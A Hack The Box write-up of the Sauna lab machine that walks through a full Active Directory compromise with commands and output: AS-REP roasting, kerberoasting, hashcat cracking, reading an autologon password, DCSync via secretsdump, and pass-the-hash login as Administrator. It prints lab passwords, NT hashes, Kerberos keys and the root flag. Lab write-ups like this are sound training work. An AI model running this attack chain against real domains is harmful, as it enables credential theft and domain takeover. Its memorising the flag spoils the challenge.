---
title: Sauna
summary: Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), AS-REP roasting.
date: 2026-04-06
tags: [Hack The Box, Active Directory, Windows]
difficulty: easy
os: Windows
url: https://app.hackthebox.com/machines/Sauna
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Sauna%20%5BAD%5D/Sauna%20%5BAD%5D.md
---

# Sauna
## Enumeration
### Open ports
```python
nmap -p- --min-rate=3000 -sT 10.129.95.180
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 21:16 +0000
Nmap scan report for SAUNA.EGOTISTICAL-BANK.LOCAL (10.129.95.180)
Host is up (0.017s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49685/tcp open  unknown
49692/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 43.95 seconds
```
### Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=3000 -sT EGOTISTICAL-BANK.LOCAL
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 21:20 +0000
Nmap scan report for EGOTISTICAL-BANK.LOCAL (10.129.95.180)
Host is up (0.017s latency).
rDNS record for 10.129.95.180: SAUNA.EGOTISTICAL-BANK.LOCAL

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 04:20:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain controller is running at +7h

## SMB (445)
Null auth is enabled, cannot list shares or enumerate users
Guest account is disabled

## HTTP (80)
### Nuclei
```python
nuclei -u http://EGOTISTICAL-BANK.LOCAL/                      

[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ga2pcdrh*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/*~1*/a.aspx
[waf-detect:modsecurity] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[ldap-metadata] [javascript] [info] EGOTISTICAL-BANK.LOCAL:389 ["ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL","DefaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL","DomainFunctionality: 7"]
[smb-version-detect:smb-version] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["SMB 2.1"]
[smb2-capabilities] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb2-server-time] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["SystemTime: 2026-03-09T04:28:55.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb-enum-domains] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["DomainName: EGOTISTICAL-BANK.LOCAL"]
[smb-enum] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["ForestName: EGOTISTICAL-BANK.LOCAL","OSVersion: 10.0.17763","NetBIOSComputerName: SAUNA","NetBIOSDomainName: EGOTISTICALBANK","DNSComputerNamen: SAUNA.EGOTISTICAL-BANK.LOCAL","DNSComputerName: SAUNA.EGOTISTICAL-BANK.LOCAL"]
[smb-os-detect] [javascript] [info] EGOTISTICAL-BANK.LOCAL:445 ["Windows Server 2019, Version 1809"]
[ldap-anonymous-login-detect] [javascript] [medium] EGOTISTICAL-BANK.LOCAL:389
[old-copyright] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ ["\u00a9 2019"]
[http-missing-security-headers:x-frame-options] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:clear-site-data] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:permissions-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:x-content-type-options] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:referrer-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:strict-transport-security] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[http-missing-security-headers:content-security-policy] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[form-detection] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[missing-sri] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ ["//fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800"]
[tech-detect:font-awesome] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[tech-detect:bootstrap] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[tech-detect:google-font-api] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[tech-detect:ms-iis] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[microsoft-iis-version] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ ["Microsoft-IIS/10.0"]
[addeventlistener-detect] [http] [info] http://EGOTISTICAL-BANK.LOCAL/
[email-extractor] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ ["example@email.com","info@example.com"]
[options-method] [http] [info] http://EGOTISTICAL-BANK.LOCAL/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[caa-fingerprint] [dns] [info] EGOTISTICAL-BANK.LOCAL
```
### Ffuf for vhosts
```python
nothing found
```
### Feroxbuster
```python
feroxbuster -u http://EGOTISTICAL-BANK.LOCAL// -C 404

301      GET        2l       10w      160c http://egotistical-bank.local/images => http://egotistical-bank.local/images/
301      GET        2l       10w      157c http://egotistical-bank.local/css => http://egotistical-bank.local/css/
200      GET      385l     1324w    14226c http://egotistical-bank.local/css/slider.css
200      GET      122l      750w    60163c http://egotistical-bank.local/images/t4.jpg
200      GET      325l      770w    15634c http://egotistical-bank.local/contact.html
200      GET      684l     1814w    38059c http://egotistical-bank.local/single.html
301      GET        2l       10w      160c http://egotistical-bank.local/Images => http://egotistical-bank.local/Images/
200      GET      138l      940w    76395c http://egotistical-bank.local/images/t3.jpg
301      GET        2l       10w      159c http://egotistical-bank.local/fonts => http://egotistical-bank.local/fonts/
200      GET     2337l     3940w    37414c http://egotistical-bank.local/css/font-awesome.css
200      GET     8975l    17530w   178152c http://egotistical-bank.local/css/bootstrap.css
200      GET      389l     1987w   159728c http://egotistical-bank.local/images/ab.jpg
200      GET     2168l     4106w    37019c http://egotistical-bank.local/css/style.css
301      GET        2l       10w      157c http://egotistical-bank.local/CSS => http://egotistical-bank.local/CSS/
200      GET      640l     1767w    30954c http://egotistical-bank.local/about.html
200      GET      470l     1279w    24695c http://egotistical-bank.local/blog.html
200      GET      111l      661w    50106c http://egotistical-bank.local/images/t1.jpg
200      GET      144l      850w    71769c http://egotistical-bank.local/images/t2.jpg
200      GET      268l     2037w   191775c http://egotistical-bank.local/images/skill2.jpg
200      GET      683l     1813w    32797c http://egotistical-bank.local/index.html
200      GET      657l     3746w   345763c http://egotistical-bank.local/images/skill1.jpg
200      GET      683l     1813w    32797c http://egotistical-bank.local/
301      GET        2l       10w      157c http://egotistical-bank.local/Css => http://egotistical-bank.local/Css/
301      GET        2l       10w      160c http://egotistical-bank.local/IMAGES => http://egotistical-bank.local/IMAGES/
301      GET        2l       10w      159c http://egotistical-bank.local/Fonts => http://egotistical-bank.local/Fonts/
```
### Website functionality
![Screenshot](images/sauna/pasted-image-20260406002629.webp)
Found some users on the system

```python
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```
Ill use username anarchy to create a userlist

```python
./username-anarchy -i ../users.txt > ../user-variations.txt
```
This created the list for me

## AS-REP roasting
```python
kerbrute userenum -d egotistical-bank.local --dc sauna.egotistical-bank.local user-variations.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/08/26 - Ronnie Flathers @ropnop

2026/03/08 21:48:08 >  Using KDC(s):
2026/03/08 21:48:08 >  	sauna.egotistical-bank.local:88

2026/03/08 21:48:08 >  [+] VALID USERNAME:	 fsmith@egotistical-bank.local
2026/03/08 21:48:08 >  Done! Tested 88 usernames (1 valid) in 0.172 seconds
```
Using the list i got from username anarchy i validated users

```python
nxc ldap sauna.egotistical-bank.local -u fsmith -p '' --asreproast asrep.hash 
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b6d3350e166f24ec9b95dbfa2e5d7486$b64b0d64b8bcba222ecce7938f0d7cb19e91722f3237e3ef668eae419149512837ac0629430b97209d74f89df11a57c2594765880870916bd97b918f07d5954b1de0d9f42f4a762bb61c51a224d80be0f77e5bd2c66dd57bde6757c77fe6a4889baf2ee20f471c38e1802f8d93461842695ae1050176640e3cdab6027972795a4ccb653e442b5223d7ea30c6473ff8b1f973a49b128cb16d1a54c3eb129196f8d1c9308e3783330b89bac97b3929cd59007983439d2fd79ae53324a003959b73de1ed30f8d9b83eb8a912e6f6954b8a1b0aa28afd4ac4b3f870211d143ee2abdc6f391ec65c91f4eacd185d36c3c3183b95786a8536852185fa44864c15c6dd7
```
Ive found a hash

### Cracking the hash
```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b6d3350e166f24ec9b95dbfa2e5d7486$b64b0d64b8bcba222ecce7938f0d7cb19e91722f3237e3ef668eae419149512837ac0629430b97209d74f89df11a57c2594765880870916bd97b918f07d5954b1de0d9f42f4a762bb61c51a224d80be0f77e5bd2c66dd57bde6757c77fe6a4889baf2ee20f471c38e1802f8d93461842695ae1050176640e3cdab6027972795a4ccb653e442b5223d7ea30c6473ff8b1f973a49b128cb16d1a54c3eb129196f8d1c9308e3783330b89bac97b3929cd59007983439d2fd79ae53324a003959b73de1ed30f8d9b83eb8a912e6f6954b8a1b0aa28afd4ac4b3f870211d143ee2abdc6f391ec65c91f4eacd185d36c3c3183b95786a8536852185fa44864c15c6dd7:Thestrokes23
```
The hash cracked

```python
fsmith:Thestrokes23
```
Now i can verify access

## Compromising `fsmith`
```python
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                              Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share
```
The user is compromised, also has access on two non-default shares
Now i can also dump users
### Dumping users
```python
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' --users-export users.txt              
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.129.95.180   445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.180   445    SAUNA            Administrator                 2021-07-26 16:16:16 2       Built-in account for administering the computer/domain 
SMB         10.129.95.180   445    SAUNA            Guest                         <never>             2       Built-in account for guest access to the computer/domain 
SMB         10.129.95.180   445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account 
SMB         10.129.95.180   445    SAUNA            HSmith                        2020-01-23 05:54:34 0        
SMB         10.129.95.180   445    SAUNA            FSmith                        2020-01-23 16:45:19 0        
SMB         10.129.95.180   445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0        
SMB         10.129.95.180   445    SAUNA            [*] Enumerated 6 local users: EGOTISTICALBANK
SMB         10.129.95.180   445    SAUNA            [*] Writing 6 local users to users.txt
```
This has dumped all the users and exported them for me!

## Kerberoasting
```python
faketime -f +7h nxc ldap SAUNA.EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' --kerberoasting kerb.hash
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            [*] Skipping disabled account: krbtgt
LDAP        10.129.95.180   389    SAUNA            [*] Total of records returned 1
LDAP        10.129.95.180   389    SAUNA            [*] sAMAccountName: HSmith, memberOf: [], pwdLastSet: 2020-01-23 05:54:34.140321, lastLogon: <never>
LDAP        10.129.95.180   389    SAUNA            $krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$745d1bd61a46b436f4a6c05bc5bce0b5$39ada6ab9955e7fcff8d725c0975760aa567e1ca64e8c55356c035c9c96ab8b4b98d23de4ba5006f884e0e7138f7206393166796d48d87ac0c71c1de9e35c2bbcd52c5ad8f6abe2dfe6e1b4991945c04807c3eec7a4b6f95f90b8beac435d6239683de74cf942aae2936afb938099f355e8a8c02fcf39724a49dd831ce5d24fea1ae0d636eac74dba64faa4e35cc1bfda483a876f297fc66ffccfca62cd4e7bc7af5641c7043fdfae473e418716f1befdfc81b636229a39d402574f5b6cd4ad5928fbb1f8a13ed79a8216ed18cc0593273d05b1d08378b5c20f49bf5d3f7dcfc18bd7b68e1eba0b1e590d6423f1a69439a1a2bd616c350080799e7dc6018d48d5a2d69007227793dd32ccfa7e9177f5143febed23fdcffab7ec6b106d87493b1cdcf1d1e6a70e7fe319f7a6e6846dfb854e4437ce106742461dd14e60a7830a42f16ddf48d3505379c7feda23fa8336d25e8bced868f75b191068f5720af79adfd213cc3de9067adea57b06422a8c09d8d2d690c4dc91fe59fa017a4a508b8180b799f3d5311f1d3bd82a2045c5f393fd7ede8da83b6c6e68a367a0a47e052d5ed5cc7491ad31e6397f1aa6b348179680ac777fd02eea6b6f460deb12353fae29f7c0320f2bf2a5ecc323e3ad5cfca9a746b17ac71fcc5d1d4a9acd52787292835d7c3374c0dd0531322b8369041e20e1a04598c0f67176f07c4a36f2541540ad8cea59dc07111bb121f0cd590e41c6125df88c4a619181104620bbd9f35fb53cb3f903ed2e7121f839f5562dd4179068a73953d35386246b690ae1c8c715327d24d72770ba3a115ab747657c8ef26d087718f61fe814247b516c6c7f00bb37b950b5039272acbef53f60fdab5e30ab35adce9135b705149035f002ace3aa2b800d7e2ad9418e4c5388d35eb9e83391281324ebf482f3230c2085d0ae1f6135adbb08b3f5274ab8a4a5ed534ce609f881b39ee70e8abe14bffb28057b31c3fcb0d3bce12fb345cf642c9151deff6eca97936fa69c63d5201c87874e32d5a710370140fe1dac0b2121c910d30da561eceb4cdaf626304c1fceee1b6ee0173a6e9b24a8cd7bcdd2cbb3a1c4614286c662f59c169dfd63d05ba49aeb61edddff7ed2490ba76d7553040831e6cd8d64de271a9024933b253dab82c306c1158136912b8814b7fbbe4197121a916e84a243b7fc53822d05802987e522fa21f0a6d5524528f0e62f7440c8f6f349dc048a4a1bd33fdd221792a097f23ef79d7a6122a3e8b0795568146ec399681a4281ca44f127e6d4602bca559043d6ad8361db6ce3de8e7428e03bc6c20ed9bc24e3139514b8f7bd2ae89cec6e0875330913e167faa712ee1f3768e4bd9225bc6dc1b41a591aecc0c2a56a4e807d860b93e909085bda379194d6c
```
Ive got a hash via kerberoasting

### Cracking the hash
```python
hashcat kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$745d1bd61a46b436f4a6c05bc5bce0b5$39ada6ab9955e7fcff8d725c0975760aa567e1ca64e8c55356c035c9c96ab8b4b98d23de4ba5006f884e0e7138f7206393166796d48d87ac0c71c1de9e35c2bbcd52c5ad8f6abe2dfe6e1b4991945c04807c3eec7a4b6f95f90b8beac435d6239683de74cf942aae2936afb938099f355e8a8c02fcf39724a49dd831ce5d24fea1ae0d636eac74dba64faa4e35cc1bfda483a876f297fc66ffccfca62cd4e7bc7af5641c7043fdfae473e418716f1befdfc81b636229a39d402574f5b6cd4ad5928fbb1f8a13ed79a8216ed18cc0593273d05b1d08378b5c20f49bf5d3f7dcfc18bd7b68e1eba0b1e590d6423f1a69439a1a2bd616c350080799e7dc6018d48d5a2d69007227793dd32ccfa7e9177f5143febed23fdcffab7ec6b106d87493b1cdcf1d1e6a70e7fe319f7a6e6846dfb854e4437ce106742461dd14e60a7830a42f16ddf48d3505379c7feda23fa8336d25e8bced868f75b191068f5720af79adfd213cc3de9067adea57b06422a8c09d8d2d690c4dc91fe59fa017a4a508b8180b799f3d5311f1d3bd82a2045c5f393fd7ede8da83b6c6e68a367a0a47e052d5ed5cc7491ad31e6397f1aa6b348179680ac777fd02eea6b6f460deb12353fae29f7c0320f2bf2a5ecc323e3ad5cfca9a746b17ac71fcc5d1d4a9acd52787292835d7c3374c0dd0531322b8369041e20e1a04598c0f67176f07c4a36f2541540ad8cea59dc07111bb121f0cd590e41c6125df88c4a619181104620bbd9f35fb53cb3f903ed2e7121f839f5562dd4179068a73953d35386246b690ae1c8c715327d24d72770ba3a115ab747657c8ef26d087718f61fe814247b516c6c7f00bb37b950b5039272acbef53f60fdab5e30ab35adce9135b705149035f002ace3aa2b800d7e2ad9418e4c5388d35eb9e83391281324ebf482f3230c2085d0ae1f6135adbb08b3f5274ab8a4a5ed534ce609f881b39ee70e8abe14bffb28057b31c3fcb0d3bce12fb345cf642c9151deff6eca97936fa69c63d5201c87874e32d5a710370140fe1dac0b2121c910d30da561eceb4cdaf626304c1fceee1b6ee0173a6e9b24a8cd7bcdd2cbb3a1c4614286c662f59c169dfd63d05ba49aeb61edddff7ed2490ba76d7553040831e6cd8d64de271a9024933b253dab82c306c1158136912b8814b7fbbe4197121a916e84a243b7fc53822d05802987e522fa21f0a6d5524528f0e62f7440c8f6f349dc048a4a1bd33fdd221792a097f23ef79d7a6122a3e8b0795568146ec399681a4281ca44f127e6d4602bca559043d6ad8361db6ce3de8e7428e03bc6c20ed9bc24e3139514b8f7bd2ae89cec6e0875330913e167faa712ee1f3768e4bd9225bc6dc1b41a591aecc0c2a56a4e807d860b93e909085bda379194d6c:Thestrokes23
```
This appears to be the same password

```python
hsmith:Thestrokes23
```
Now ill test these creds, it might also be worth running a password spray against all these users and see if this password is set anywhere else

## Compromising `hsmith`
```python
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'hsmith' -p 'Thestrokes23' --shares      
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23 
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                              Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share
```
Its also worth noting this password is only applied for these two accounts
The user does not have access over WINRM

## Bloodhound
The user `fsmith` is part of the remote management users group, which means i should be able to get access via winrm
Neither of the compromised users are part of any interesting groups
## Compromising `svc_loanmgr`
```python
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .


    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion


Name                           Property
----                           --------
winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : EGOTISTICALBANK
                               DefaultUserName              : EGOTISTICALBANK\svc_loanmanager
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 2358450679
                               ShutdownFlags                : 2147484203
                               DisableLockWorkstation       : 0
                               DefaultPassword              : Moneymakestheworldgoround!
```
Found some creds for the user 

```python
svc_loanmgr:Moneymakestheworldgoround!
```
Ill verify these creds

```python
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' 
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```
This user is compromised
Now looking at this user on bloodhound i have some interesting privileges

## DCSync leads to full domain compromise
The new user has GetChanges and GetChangesAll on the domain
![Screenshot](images/sauna/pasted-image-20260406002645.webp)

```python
secretsdump.py 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'sauna.egotistical-bank.local'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:3dbde6323671c4b15194978ab5b7ba9b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:4f3324e01311d0ef85f68ab33895623595b353653866dabd8ce97a600762ae43
SAUNA$:aes128-cts-hmac-sha1-96:beff6a053a31ac683ab07d296eeb6666
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```
Here ive dumped all the hashes on the domain

```python
evil-winrm -i egotistical-bank.local -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
||ee1ba015e27ac8213cfbcdccaca7d481||
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
